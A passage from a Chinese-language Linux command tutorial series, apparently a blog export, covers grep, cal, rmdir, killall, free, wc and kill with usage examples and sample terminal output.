linuxtest.txt:7:linuxminttest2.txt:1:linux[root@localhost test]# grep 'linux' test.txt test2.txt test.txt:hnlinuxtest.txt:ubuntu linuxtest.txt:linuxminttest2.txt:linux[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;多文件时，输出查询到的信息内容行时，会把文件的命名在行最前面输出并且加上”:”作为标示符 实例7：grep不显示本身进程&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12ps aux|grep \[s]shps aux | grep ssh | grep -v "grep" &#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011[root@localhost test]# ps aux|grep sshroot 2720 0.0 0.0 62656 1212 ? Ss Nov02 0:00 /usr/sbin/sshdroot 16834 0.0 0.0 88088 3288 ? Ss 19:53 0:00 sshd: root@pts/0 root 16901 0.0 0.0 61180 764 pts/0 S+ 20:31 0:00 grep ssh[root@localhost test]# ps aux|grep \[s]sh][root@localhost test]# ps aux|grep \[s]shroot 2720 0.0 0.0 62656 1212 ? Ss Nov02 0:00 /usr/sbin/sshdroot 16834 0.0 0.0 88088 3288 ? Ss 19:53 0:00 sshd: root@pts/0 [root@localhost test]# ps aux | grep ssh | grep -v "grep"root 2720 0.0 0.0 62656 1212 ? Ss Nov02 0:00 /usr/sbin/sshdroot 16834 0.0 0.0 88088 3288 ? Ss 19:53 0:00 sshd: root@pts/0 实例8：找出已u开头的行内容&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cat test.txt |grep ^u &#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost test]# cat test.txt |grep ^uubuntuubuntu linux[root@localhost test]# 实例9：输出非u开头的行内容&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cat test.txt |grep ^[^u] &#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@localhost test]# cat test.txt |grep ^[^u]hnlinuxpeida.cnblogs.comredhatRedhatlinuxmint[root@localhost test]# 实例10：输出以hat结尾的行内容&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cat test.txt |grep hat$ &#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost test]# cat test.txt |grep hat$redhatRedhat[root@localhost test]# 实例11：&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test]# ifconfig eth0|grep "[0-9]\&#123;1,3\&#125;\.[0-9]\&#123;1,3\&#125;\.[0-9]\&#123;1,3\&#125;\.[0-9]\&#123;1,3\&#125;" inet addr:192.168.120.204 Bcast:192.168.120.255 Mask:255.255.255.0[root@localhost test]# ifconfig eth0|grep -E "([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]" inet addr:192.168.120.204 Bcast:192.168.120.255 Mask:255.255.255.0[root@localhost test]# 实例12：显示包含ed或者at字符的内容行&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cat test.txt |grep -E "ed|at" &#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@localhost test]# cat test.txt |grep -E "peida|com"peida.cnblogs.com[root@localhost test]# cat test.txt |grep -E "ed|at"redhatRedhat[root@localhost test]# 实例13：显示当前目录下面以.txt 结尾的文件中的所有包含每个字符串至少有7个连续小写字符的字符串的行&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1grep '[a-z]\&#123;7\&#125;' *.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test]# grep '[a-z]\&#123;7\&#125;' *.txttest.txt:hnlinuxtest.txt:peida.cnblogs.comtest.txt:linuxmint[root@localhost test]#]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- cal]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F40.%20Linux%20%E5%91%BD%E4%BB%A4-%20cal%2F</url>
    <content type="text"><![CDATA[Linux 命令- cal&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cal命令可以用来显示公历（阳历）日历。公历是现在国际通用的历法，又称格列历，通称阳历。“阳历”又名“太阳历”，系以地球绕行太阳一周为一年，为西方各国所通用，故又名“西历”。 1．命令格式1cal [参数][月份][年份] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用于查看日历等时间信息，如只有一个参数，则表示年份(1-9999)，如有两个参数，则表示月份和年份 3．命令参数 -1 显示一个月的月历 -3 显示系统前一个月，当前月，下一个月的月历 -s 显示星期天为一个星期的第一天，默认的格式 -m 显示星期一为一个星期的第一天 -j 显示在当年中的第几天（一年日期按天算，从1月1号算起，默认显示当前月在一年中的天数） -y 显示当前年份的日历 4．使用实例实例1：显示当前月份日历&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cal &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@localhost ~]# cal 十二月 2012 日 一 二 三 四 五 六 1 2 3 4 5 6 7 8 9 10 11 12 13 14 1516 17 18 19 20 21 2223 24 25 26 27 28 2930 31[root@localhost ~]# 实例2：显示指定月份的日历&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cal 9 2012 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789[root@localhost ~]# cal 9 2012 九月 2012 日 一 二 三 四 五 六 1 2 3 4 5 6 7 8 9 10 11 12 13 14 1516 17 18 19 20 21 2223 24 25 26 27 28 2930 实例3：显示2013年日历&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12cal -y 2013 cal 2013 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 实例4：显示自1月1日的天数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cal -j &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789[root@localhost ~]# cal -j 十二月 2012 日 一 二 三 四 五 六 336337 338 339 340 341 342 343344 345 346 347 348 349 350351 352 353 354 355 356 357358 359 360 361 362 363 364365 366[root@localhost ~]# 实例5：星期一显示在第一列&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cal -m &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@localhost ~]# cal -m 十二月 2012 一 二 三 四 五 六 日 1 2 3 4 5 6 7 8 910 11 12 13 14 15 1617 18 19 20 21 22 2324 25 26 27 28 29 3031[root@localhost ~]#]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- rmdir]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F5.%20Linux%20%E5%91%BD%E4%BB%A4-rmdir%2F</url>
    <content type="text"><![CDATA[Linux 命令- rmdir&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rmdir是常用的命令，该命令的功能是删除空目录，一个目录被删除之前必须是空的。（注意，rm - r dir命令可代替rmdir，但是有很大危险性。）删除某目录时也必须具有对父目录的写权限。 1．命令格式：1rmdir [选项] [目录] 2．命令功能：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该命令从一个目录中删除一个或多个子目录项，删除某目录时也必须具有对父目录的写权限。 3．命令参数： p 递归删除目录dirname，当子目录删除后其父目录为空时，也一同被删除。如果整个路径被删除或者由于某种原因保留部分路径，则系统在标准输出上显示相应的信息。 -v, –verbose 显示指令执行过程 4．命令实例：实例1：rmdir 不能删除非空目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1rmdir doc &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678910111213141516171819202122232425262728293031323334[root@localhost scf]# tree.|-- bin|-- doc| |-- info| `-- product|-- lib|-- logs| |-- info| `-- product`-- service `-- deploy |-- info `-- product 12 directories, 0 files[root@localhost scf]# rmdir docrmdir: doc: 目录非空[root@localhost scf]# rmdir doc/info[root@localhost scf]# rmdir doc/product[root@localhost scf]# tree.|-- bin|-- doc|-- lib|-- logs| |-- info| `-- product`-- service `-- deploy |-- info `-- product 10 directories, 0 files &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rmdir 目录名 命令不能直接删除非空目录 实例2：rmdir -p 当子目录被删除后使它也成为空目录的话，则顺便一并删除&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1rmdir -p logs &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678910111213141516171819202122232425262728293031323334353637383940[root@localhost scf]# tree.|-- bin|-- doc|-- lib|-- logs| `-- product`-- service `-- deploy |-- info `-- product 10 directories, 0 files[root@localhost scf]# rmdir -p logsrmdir: logs: 目录非空[root@localhost scf]# tree.|-- bin|-- doc|-- lib|-- logs| `-- product`-- service `-- deploy |-- info `-- product 9 directories, 0 files[root@localhost scf]# rmdir -p logs/product[root@localhost scf]# tree.|-- bin|-- doc|-- lib`-- service`-- deploy |-- info `-- product 7 directories, 0 files]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- killall]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F45.%20Linux%20%E5%91%BD%E4%BB%A4-%20killall%2F</url>
    <content type="text"><![CDATA[Linux 命令- killall&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux系统中的killall命令用于杀死指定名字的进程（kill processes by name）。我们可以使用kill命令杀死指定进程PID的进程，如果要找到我们需要杀死的进程，我们还需要在之前使用ps等命令再配合grep来查找进程，而killall把这两个过程合二为一，是一个很好用的命令。 1．命令格式1killall [参数] [进程名] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用来结束同名的的所有进程 3．命令参数 -Z 只杀死拥有scontext 的进程 -e 要求匹配进程名称 -I 忽略小写 -g 杀死进程组而不是进程 -i 交互模式，杀死进程前先询问用户 -l 列出所有的已知信号名称 -q 不输出警告信息 -s 发送指定的信号 -v 报告信号是否成功发送 -w 等待进程死亡 –help 显示帮助信息 –version 显示版本显示 4．使用实例实例1：杀死所有同名进程&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1killall vi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@localhost ~]# ps -ef|grep viroot 17581 17398 0 17:51 pts/0 00:00:00 vi test.txtroot 17611 17582 0 17:51 pts/1 00:00:00 grep vi[root@localhost ~]# ps -ef|grep viroot 17581 17398 0 17:51 pts/0 00:00:00 vi test.txtroot 17640 17612 0 17:51 pts/2 00:00:00 vi test.logroot 17642 17582 0 17:51 pts/1 00:00:00 grep vi[root@localhost ~]# killall vi[root@localhost ~]# ps -ef|grep viroot 17645 17582 0 17:52 pts/1 00:00:00 grep vi 实例2：向进程发送指定信号&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;后台运行程序： 1vi &amp; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;杀死 vi进程： 1killall -TERM vi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者 1killall -KILL vi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920[root@localhost ~]# vi &amp; [1] 17646[root@localhost ~]# killall -TERM vi[1]+ Stopped vi[root@localhost ~]# vi &amp; [2] 17648[root@localhost ~]# ps -ef|grep viroot 17646 17582 0 17:54 pts/1 00:00:00 viroot 17648 17582 0 17:54 pts/1 00:00:00 viroot 17650 17582 0 17:55 pts/1 00:00:00 grep vi[2]+ Stopped vi[root@localhost ~]# killall -TERM vi[root@localhost ~]# ps -ef|grep viroot 17646 17582 0 17:54 pts/1 00:00:00 viroot 17648 17582 0 17:54 pts/1 00:00:00 viroot 17653 17582 0 17:55 pts/1 00:00:00 grep vi[root@localhost ~]# killall -KILL vi[1]- 已杀死 vi[2]+ 已杀死 vi[root@localhost ~]# ps -ef|grep viroot 17656 17582 0 17:56 pts/1 00:00:00 grep vi[root@localhost ~]# 实例3：把所有的登录后的shell给杀掉&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1killall -9 bash &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@localhost ~]# w 18:01:03 up 41 days, 18:53, 3 users, load average: 0.00, 0.00, 0.00USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATroot pts/0 10.2.0.68 14:58 9:52 0.10s 0.10s -bashroot pts/1 10.2.0.68 17:51 0.00s 0.02s 0.00s wroot pts/2 10.2.0.68 17:51 9:24 0.01s 0.01s -bash[root@localhost ~]# killall -9 bash[root@localhost ~]# w 18:01:48 up 41 days, 18:54, 1 user, load average: 0.07, 0.02, 0.00USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATroot pts/0 10.2.0.68 18:01 0.00s 0.01s 0.00s w[root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;运行命令：killall -9 bash 后，所有bash都会被卡掉了，所以当前所有连接丢失了。需要重新连接并登录。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- free]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F47.%20Linux%20%E5%91%BD%E4%BB%A4-%20free%2F</url>
    <content type="text"><![CDATA[Linux 命令- free&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;free命令可以显示Linux系统中空闲的、已用的物理内存及swap内存,及被内核使用的buffer。在Linux系统监控的工具中，free命令是最经常使用的命令之一。 1．命令格式1free [参数] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;free 命令显示系统使用和空闲的内存情况，包括物理内存、交互区内存(swap)和内核缓冲区内存。共享内存将被忽略 3．命令参数 -b 以Byte为单位显示内存使用情况。 -k 以KB为单位显示内存使用情况。 -m 以MB为单位显示内存使用情况。 -g 以GB为单位显示内存使用情况。 -o 不显示缓冲区调节列。 -s&lt;间隔秒数&gt; 持续观察内存使用状况。 -t 显示内存总和列。 -V 显示版本信息。 4．使用实例实例1：显示内存使用情况&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 123freefree -gfree -m &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415[root@SF1150 service]# free total used free shared buffers cachedMem: 32940112 30841684 2098428 0 4545340 11363424-/+ buffers/cache: 14932920 18007192Swap: 32764556 1944984 30819572[root@SF1150 service]# free -g total used free shared buffers cachedMem: 31 29 2 0 4 10-/+ buffers/cache: 14 17Swap: 31 1 29[root@SF1150 service]# free -m total used free shared buffers cachedMem: 32168 30119 2048 0 4438 11097-/+ buffers/cache: 14583 17584Swap: 31996 1899 30097 说明下面是对这些数值的解释： total:总计物理内存的大小。 used:已使用多大。 free:可用有多少。 Shared:多个进程共享的内存总额。 Buffers/cached:磁盘缓存的大小。 第三行(-/+ buffers/cached): used:已使用多大。 free:可用有多少。 第四行是交换分区SWAP的，也就是我们通常所说的虚拟内存。 区别：第二行(mem)的used/free与第三行(-/+ buffers/cache) used/free的区别。 这两个的区别在于使用的角度来看，第一行是从OS的角度来看，因为对于OS，buffers/cached 都是属于被使用，所以他的可用内存是2098428KB,已用内存是30841684KB,其中包括，内核（OS）使用+Application(X, oracle,etc)使用的+buffers+cached. 第三行所指的是从应用程序角度来看，对于应用程序来说，buffers/cached 是等于可用的，因为buffer/cached是为了提高文件读取的性能，当应用程序需在用到内存的时候，buffer/cached会很快地被回收。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以从应用程序的角度来说，可用内存=系统free memory+buffers+cached。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如本机情况的可用内存为： 18007156=2098428KB+4545340KB+11363424KB 接下来解释什么时候内存会被交换，以及按什么方交换。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当可用内存少于额定值的时候，就会开会进行交换.如何看额定值： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cat /proc/meminfo &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122232425262728[root@SF1150 service]# cat /proc/meminfoMemTotal: 32940112 kBMemFree: 2096700 kBBuffers: 4545340 kBCached: 11364056 kBSwapCached: 1896080 kBActive: 22739776 kBInactive: 7427836 kBHighTotal: 0 kBHighFree: 0 kBLowTotal: 32940112 kBLowFree: 2096700 kBSwapTotal: 32764556 kBSwapFree: 30819572 kBDirty: 164 kBWriteback: 0 kBAnonPages: 14153592 kBMapped: 20748 kBSlab: 590232 kBPageTables: 34200 kBNFS_Unstable: 0 kBBounce: 0 kBCommitLimit: 49234612 kBCommitted_AS: 23247544 kBVmallocTotal: 34359738367 kBVmallocUsed: 278840 kBVmallocChunk: 34359459371 kBHugePages_Total: 0HugePages_Free: 0HugePages_Rsvd: 0Hugepagesize: 2048 kB &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;交换将通过三个途径来减少系统中使用的物理页面的个数： 减少缓冲与页面cache的大小， 将系统V类型的内存页面交换出去， 换出或者丢弃页面。(Application 占用的内存页，也就是物理内存不足）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;事实上，少量地使用swap是不是影响到系统性能的。 那buffers和cached都是缓存，两者有什么区别呢？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为了提高磁盘存取效率, Linux做了一些精心的设计, 除了对dentry进行缓存(用于VFS,加速文件路径名到inode的转换), 还采取了两种主要Cache方式：Buffer Cache和Page Cache。前者针对磁盘块的读写，后者针对文件inode的读写。这些Cache有效缩短了 I/O系统调用(比如read,write,getdents)的时间。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;磁盘的操作有逻辑级（文件系统）和物理级（磁盘块），这两种Cache就是分别缓存逻辑和物理级数据的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Page cache实际上是针对文件系统的，是文件的缓存，在文件层面上的数据会缓存到page cache。文件的逻辑层需要映射到实际的物理磁盘，这种映射关系由文件系统来完成。当page cache的数据需要刷新时，page cache中的数据交给buffer cache，因为Buffer Cache就是缓存磁盘块的。但是这种处理在2.6版本的内核之后就变的很简单了，没有真正意义上的cache操作。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Buffer cache是针对磁盘块的缓存，也就是在没有文件系统的情况下，直接对磁盘进行操作的数据会缓存到buffer cache中，例如，文件系统的元数据都会缓存到buffer cache中。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;简单说来，page cache用来缓存文件数据，buffer cache用来缓存磁盘数据。在有文件系统的情况下，对文件操作，那么数据会缓存到page cache，如果直接采用dd等工具对磁盘进行读写，那么数据会缓存到buffer cache。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以我们看linux,只要不用swap的交换空间,就不用担心自己的内存太少.如果常常swap用很多,可能你就要考虑加物理内存了.这也是linux看内存是否够用的标准. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果是应用服务器的话，一般只看第二行，+buffers/cache,即对应用程序来说free的内存太少了，也是该考虑优化程序或加内存了。 实例2：以总和的形式显示内存的使用信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1free -t &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@SF1150 service]# free -t total used free shared buffers cachedMem: 32940112 30845024 2095088 0 4545340 11364324-/+ buffers/cache: 14935360 18004752Swap: 32764556 1944984 30819572Total: 65704668 32790008 32914660[root@SF1150 service]# 实例3：周期性的查询内存使用信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1free -s 10 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@SF1150 service]# free -s 10 total used free shared buffers cachedMem: 32940112 30844528 2095584 0 4545340 11364380-/+ buffers/cache: 14934808 18005304Swap: 32764556 1944984 30819572 total used free shared buffers cachedMem: 32940112 30843932 2096180 0 4545340 11364388-/+ buffers/cache: 14934204 18005908Swap: 32764556 1944984 30819572 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每10s 执行一次命令]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- wc]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F42.%20Linux%20%E5%91%BD%E4%BB%A4-%20wc%2F</url>
    <content type="text"><![CDATA[Linux 命令-wc&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux系统中的wc(Word Count)命令的功能为统计指定文件中的字节数、字数、行数，并将统计结果显示输出。 1．命令格式1wc [选项]文件... 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;统计指定文件中的字节数、字数、行数，并将统计结果显示输出。该命令统计指定文件中的字节数、字数、行数。如果没有给出文件名，则从标准输入读取。wc同时也给出所指定文件的总统计数。 3．命令参数 -c 统计字节数。 -l 统计行数。 -m 统计字符数。这个标志不能与 -c 标志一起使用。 -w 统计字数。一个字被定义为由空白、跳格或换行字符分隔的字符串。 -L 打印最长行的长度。 -help 显示帮助信息 –version 显示版本信息 4．使用实例实例1：查看文件的字节数、字数、行数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wc test.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920[root@localhost test]# cat test.txt hnlinuxpeida.cnblogs.comubuntuubuntu linuxredhatRedhatlinuxmint[root@localhost test]# wc test.txt 7 8 70 test.txt[root@localhost test]# wc -l test.txt 7 test.txt[root@localhost test]# wc -c test.txt 70 test.txt[root@localhost test]# wc -w test.txt 8 test.txt[root@localhost test]# wc -m test.txt 70 test.txt[root@localhost test]# wc -L test.txt 17 test.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;7&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;8&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;70&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;test.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;行数 单词数 字节数 文件名 实例2：用wc命令怎么做到只打印统计数字不打印文件名&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wc -l test.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost test]# wc -l test.txt 7 test.txt[root@localhost test]# cat test.txt |wc -l7[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用管道线，这在编写shell脚本时特别有用。 实例3：用来统计当前目录下的文件数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ls -l | wc -l &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213[root@localhost test]# cd test6[root@localhost test6]# ll总计 604---xr--r-- 1 root mail 302108 11-30 08:39 linklog.log---xr--r-- 1 mail users 302108 11-30 08:39 log2012.log-rw-r--r-- 1 mail users 61 11-30 08:39 log2013.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2014.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2015.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2016.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2017.log[root@localhost test6]# ls -l | wc -l8[root@localhost test6]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数量中包含当前目录]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- kill]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F44.%20Linux%20%E5%91%BD%E4%BB%A4-%20kill%2F</url>
    <content type="text"><![CDATA[Linux 命令- kill&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux中的kill命令用来终止指定的进程（terminate a process）的运行，是Linux下进程管理的常用命令。通常，终止一个前台进程可以使用Ctrl+C键，但是，对于一个后台进程就须用kill命令来终止，我们就需要先使用ps/pidof/pstree/top等工具获取进程PID，然后使用kill命令来杀掉该进程。kill命令是通过向进程发送指定的信号来结束相应进程的。在默认情况下，采用编号为15的TERM信号。TERM信号将终止所有不能捕获该信号的进程。对于那些可以捕获该信号的进程就要用编号为9的kill信号，强行“杀掉”该进程。 1．命令格式1kill[参数][进程号] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;发送指定的信号到相应进程。不指定型号将发送SIGTERM（15）终止指定进程。如果任无法终止该程序可用“-KILL” 参数，其发送的信号为SIGKILL(9) ，将强制结束进程，使用ps命令或者jobs 命令可以查看进程号。root用户将影响用户的进程，非root用户只能影响自己的进程。 3．命令参数 -l 信号，若果不加信号的编号参数，则使用“-l”参数会列出全部的信号名称 -a 当处理当前进程时，不限制命令名和进程号的对应关系 -p 指定kill 命令只打印相关进程的进程号，而不发送任何信号 -s 指定发送信号 -u 指定用户 注意： kill命令可以带信号号码选项，也可以不带。如果没有信号号码，kill命令就会发出终止信号(15)，这个信号可以被进程捕获，使得进程在退出之前可以清理并释放资源。也可以用kill向进程发送特定的信号。例如：kill -2 123它的效果等同于在前台运行PID为123的进程时按下Ctrl+C键。但是，普通用户只能使用不带signal参数的kill命令或最多使用-9信号。 kill可以带有进程ID号作为参数。当用kill向这些进程发送信号时，必须是这些进程的主人。如果试图撤销一个没有权限撤销的进程或撤销一个不存在的进程，就会得到一个错误信息。 可以向多个进程发信号或终止它们。 当kill成功地发送了信号后，shell会在屏幕上显示出进程的终止信息。有时这个信息不会马上显示，只有当按下Enter键使shell的命令提示符再次出现时，才会显示出来。 应注意，信号使进程强行终止，这常会带来一些副作用，如数据丢失或者终端无法恢复到正常状态。发送信号时必须小心，只有在万不得已时，才用kill信号(9)，因为进程不能首先捕获它。要撤销所有的后台作业，可以输入kill 0。因为有些在后台运行的命令会启动多个进程，跟踪并找到所有要杀掉的进程的PID是件很麻烦的事。这时，使用kill 0来终止所有由当前shell启动的进程，是个有效的方法。 4．使用实例实例1：列出所有信号名称&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1kill -l &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617[root@localhost test6]# kill -l 1) SIGHUP 2) SIGINT 3) SIGQUIT 4) SIGILL 5) SIGTRAP 6) SIGABRT 7) SIGBUS 8) SIGFPE 9) SIGKILL 10) SIGUSR1 11) SIGSEGV 12) SIGUSR213) SIGPIPE 14) SIGALRM 15) SIGTERM 16) SIGSTKFLT17) SIGCHLD 18) SIGCONT 19) SIGSTOP 20) SIGTSTP21) SIGTTIN 22) SIGTTOU 23) SIGURG 24) SIGXCPU25) SIGXFSZ 26) SIGVTALRM 27) SIGPROF 28) SIGWINCH29) SIGIO 30) SIGPWR 31) SIGSYS 34) SIGRTMIN35) SIGRTMIN+1 36) SIGRTMIN+2 37) SIGRTMIN+3 38) SIGRTMIN+439) SIGRTMIN+5 40) SIGRTMIN+6 41) SIGRTMIN+7 42) SIGRTMIN+843) SIGRTMIN+9 44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+1247) SIGRTMIN+13 48) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-1451) SIGRTMAX-13 52) SIGRTMAX-12 53) SIGRTMAX-11 54) SIGRTMAX-1055) SIGRTMAX-9 56) SIGRTMAX-8 57) SIGRTMAX-7 58) SIGRTMAX-659) SIGRTMAX-5 60) SIGRTMAX-4 61) SIGRTMAX-3 62) SIGRTMAX-263) SIGRTMAX-1 64) SIGRTMAX &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只有第9种信号(SIGKILL)才可以无条件终止进程，其他信号进程都有权利忽略。 下面是常用的信号： 1234567HUP 1 终端断线INT 2 中断（同 Ctrl + C）QUIT 3 退出（同 Ctrl + \）TERM 15 终止KILL 9 强制终止CONT 18 继续（与STOP相反， fg/bg命令）STOP 19 暂停（同 Ctrl + Z） 实例2：得到指定信号的数值&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test6]# kill -l KILL9[root@localhost test6]# kill -l SIGKILL9[root@localhost test6]# kill -l TERM15[root@localhost test6]# kill -l SIGTERM15[root@localhost test6]# 实例3：先用ps查找进程，然后用kill杀掉&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1kill 3268 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@localhost test6]# ps -ef|grep vim root 3268 2884 0 16:21 pts/1 00:00:00 vim install.logroot 3370 2822 0 16:21 pts/0 00:00:00 grep vim[root@localhost test6]# kill 3268 [root@localhost test6]# kill 3268 -bash: kill: (3268) - 没有那个进程[root@localhost test6]# 实例4：彻底杀死进程&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1kill –9 3268 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@localhost test6]# ps -ef|grep vim root 3268 2884 0 16:21 pts/1 00:00:00 vim install.logroot 3370 2822 0 16:21 pts/0 00:00:00 grep vim[root@localhost test6]# kill –9 3268 [root@localhost test6]# kill 3268 -bash: kill: (3268) - 没有那个进程[root@localhost 